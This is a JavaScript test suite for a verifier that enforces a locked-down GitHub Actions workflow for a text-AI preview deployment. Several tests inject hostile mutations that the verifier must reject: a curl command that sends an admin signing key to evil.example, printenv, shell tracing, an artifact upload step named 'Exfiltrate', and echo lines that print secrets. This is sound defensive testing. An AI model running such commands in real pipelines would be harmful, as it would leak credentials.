import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { readFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import test from 'node:test';

import { verifyTextPreviewWorkflow } from './verify-text-ai-preview-workflow.mjs';

const WORKFLOW_PATH = resolve('.github/workflows/text-ai-preview.yml');
const source = await readFile(WORKFLOW_PATH, 'utf8');
const FAILURE_MESSAGE = 'Text preview workflow policy failed';

function replaceOnce(value, before, after) {
  const first = value.indexOf(before);
  assert.notEqual(first, -1, `fixture is missing: ${before}`);
  assert.equal(value.indexOf(before, first + before.length), -1, `fixture is not unique: ${before}`);
  return `${value.slice(0, first)}${after}${value.slice(first + before.length)}`;
}

function expectPolicyFailure(value) {
  assert.throws(
    () => verifyTextPreviewWorkflow(value),
    (error) => error?.constructor === Error && error.message === FAILURE_MESSAGE,
  );
}

function branch(value, name, nextName) {
  const start = value.indexOf(`            ${name})\n`);
  const end = value.indexOf(`            ${nextName})\n`, start + 1);
  assert.notEqual(start, -1);
  assert.notEqual(end, -1);
  return value.slice(start, end);
}

test('accepts the protected manual workflow and returns only fixed policy facts', () => {
  assert.deepEqual(verifyTextPreviewWorkflow(source), {
    manualOnly: true,
    protectedEnvironment: true,
    productionDisabled: true,
    photoDisabled: true,
    maxProviderAttempts: 1,
    realRequestBudget: 1,
  });
});

test('locks the exact operation choices including rotate-user-code', () => {
  for (const operation of [
    'preflight',
    'deploy-disabled',
    'rotate-user-code',
    'enable-admin-preview',
    'status',
    'enable-second-account',
    'disable-account',
    'disable-all',
    'delete-account',
  ]) {
    assert.equal(source.includes(`          - ${operation}\n`), true, operation);
  }
  expectPolicyFailure(replaceOnce(
    source,
    '          - rotate-user-code\n',
    '          - disable-access\n',
  ));
});

test('requires the exact new Environment secret inventory and no legacy identity values', () => {
  for (const name of [
    'CLOUDFLARE_API_TOKEN',
    'ARK_API_KEY',
    'PHOTO_AI_CACHE_AES_KEY',
    'PHOTO_AI_ACCOUNT_HMAC_KEY',
    'TEXT_AI_USER_1_ACCESS_CODE_PEPPER',
    'TEXT_AI_USER_1_ACCESS_CODE_DIGEST',
    'TEXT_AI_USER_2_ACCESS_CODE_PEPPER',
    'TEXT_AI_USER_2_ACCESS_CODE_DIGEST',
    'TEXT_AI_SESSION_SIGNING_KEY',
    'TEXT_AI_RATE_LIMIT_HMAC_KEY',
    'TEXT_AI_ADMIN_SIGNING_KEY',
  ]) {
    assert.equal(source.includes(`${name}: \${{ secrets.${name} }}`), true, name);
  }
  for (const pattern of [
    /\/access\//i,
    /cloudflareaccess[.]com/i,
    /cf-access-client/i,
    /TEXT_AI_TEAM_DOMAIN/,
    /TEXT_AI_USER_[123]_EMAIL/,
    /TEXT_AI_ADMIN_EMAIL/,
    /TEXT_AI_CF_ACCESS/,
  ]) {
    assert.equal(pattern.test(source), false, String(pattern));
  }
});

test('rotate-user-code only reapplies Pages bindings and deploys the fixed SHA', () => {
  const rotate = branch(source, 'rotate-user-code', 'enable-admin-preview');
  assert.equal(rotate.includes("ROTATE_ONE_TEXT_ACCESS_CODE"), true);
  assert.equal(rotate.includes('user-1|user-2'), true);
  assert.equal(rotate.match(/text-ai-preview-control[.]mjs configure/g)?.length, 1);
  assert.equal(rotate.match(/deploy_pages_preview/g)?.length, 1);
  assert.equal(rotate.includes('invoke-admin'), false);
  assert.equal(rotate.includes('deploy_worker_'), false);
  assert.equal(rotate.includes('write_worker_secret_file'), false);

  expectPolicyFailure(replaceOnce(
    source,
    "'ROTATE_ONE_TEXT_ACCESS_CODE'",
    "'ROTATE_ANY_TEXT_ACCESS_CODE'",
  ));
});

test('first-account enable reports only the fixed safe operation stages', () => {
  const enable = branch(source, 'enable-admin-preview', 'status');
  const stages = [...enable.matchAll(/^ {14}report_enable_stage '([a-z0-9-]+)'$/gm)]
    .map((match) => match[1]);
  const stageCommands = [
    ['write-worker-secret', 'write_worker_secret_file'],
    ['capture-status', 'capture_status_pair'],
    ['assert-preconditions', 'assert_enable_admin_preconditions'],
    ['configure-pages', 'node scripts/text-ai-preview-control.mjs configure > /dev/null'],
    ['enable-user-1', 'node scripts/text-ai-preview-control.mjs invoke-admin --operation=enable-account --target=user-1 > /dev/null'],
    ['enable-text-global', 'node scripts/text-ai-preview-control.mjs invoke-admin --operation=enable-text-global --target=user-1 > /dev/null'],
    ['deploy-worker-enabled', 'deploy_worker_enabled'],
  ];

  assert.equal(source.includes(
    "          report_enable_stage() {\n            printf 'Text preview enable stage: %s\\n' \"${1-}\" >&2 || :\n          }\n",
  ), true);
  assert.deepEqual(stages, stageCommands.map(([stage]) => stage));
  for (const [stage, command] of stageCommands) {
    assert.equal(enable.includes(
      `              report_enable_stage '${stage}'\n              ${command}\n`,
    ), true, stage);
  }
});

test('disable-all attempts only global disable and disabled Worker deployment', () => {
  const disable = branch(source, 'disable-all', 'delete-account');
  assert.equal(disable.includes('--operation=disable-text-global --target=user-1'), true);
  assert.equal(disable.includes('deploy_worker_disabled'), true);
  assert.equal(disable.includes('disable-access'), false);
  assert.equal(disable.includes("['disable-text-global', 'deploy-worker-disabled']"), true);
  assert.equal(disable.includes('/^[0-3]$/u'), true);
});

test('pins the source commit, fixed Pages branch, disabled photo path, and one provider attempt', () => {
  for (const required of [
    "github.ref == 'refs/heads/main'",
    'github.ref_protected == true',
    'github.sha == inputs.expected_sha',
    'persist-credentials: false',
    '--branch=text-ai-preview --commit-hash="$GITHUB_SHA"',
    'TEXT_AI_MAX_PROVIDER_ATTEMPTS:1',
    'PHOTO_AI_GATEWAY_ENABLED:false',
    "VITE_ENABLE_PHOTO_AI: 'false'",
    '# REAL_TEXT_AI_REQUEST_BUDGET: 1',
    '# NO_REAL_MEAL_REQUEST_IN_WORKFLOW',
  ]) {
    assert.equal(source.includes(required), true, required);
  }
});

test('rejects secret exfiltration, tracing, artifacts, and arbitrary dispatch commands', () => {
  for (const mutation of [
    replaceOnce(source, '          set -euo pipefail\n', '          set -euxo pipefail\n'),
    replaceOnce(source, '          umask 077\n', '          umask 077\n          printenv\n'),
    replaceOnce(
      source,
      '          case "$TEXT_AI_OPERATION" in\n',
      '          curl https://evil.example --data "$TEXT_AI_ADMIN_SIGNING_KEY"\n          case "$TEXT_AI_OPERATION" in\n',
    ),
    replaceOnce(
      source,
      '      - name: Worker dry-run\n',
      '      - name: Exfiltrate\n        uses: actions/upload-artifact@v4\n      - name: Worker dry-run\n',
    ),
  ]) {
    expectPolicyFailure(mutation);
  }
});

test('rejects any legacy Access shape inserted in runtime workflow text', () => {
  for (const injected of [
    '          node scripts/text-ai-preview-control.mjs disable-access\n',
    '          curl https://team.cloudflareaccess.com/access/apps\n',
    '          echo "$TEXT_AI_USER_1_EMAIL"\n',
    '          echo "$TEXT_AI_CF_ACCESS_CLIENT_SECRET"\n',
  ]) {
    expectPolicyFailure(replaceOnce(
      source,
      '          case "$TEXT_AI_OPERATION" in\n',
      `${injected}          case "$TEXT_AI_OPERATION" in\n`,
    ));
  }
});

test('workflow verifier CLI emits one canonical report and fails closed on a mutated file', () => {
  const success = spawnSync(
    process.execPath,
    ['scripts/verify-text-ai-preview-workflow.mjs'],
    { cwd: resolve('.'), encoding: 'utf8' },
  );
  assert.equal(success.status, 0, success.stderr);
  assert.deepEqual(JSON.parse(success.stdout), verifyTextPreviewWorkflow(source));
  assert.equal(success.stderr, '');
});

test('mutation lock rejects dispatch and operation-case drift', () => {
  expectPolicyFailure(replaceOnce(
    source,
    '              deploy_pages_preview\n              ;;\n            enable-admin-preview)',
    '              deploy_pages_preview\n              deploy_pages_preview\n              ;;\n            enable-admin-preview)',
  ));
  expectPolicyFailure(replaceOnce(
    source,
    '                user-1|user-2) ;;\n',
    '                user-1|user-2|user-3) ;;\n',
  ));
});
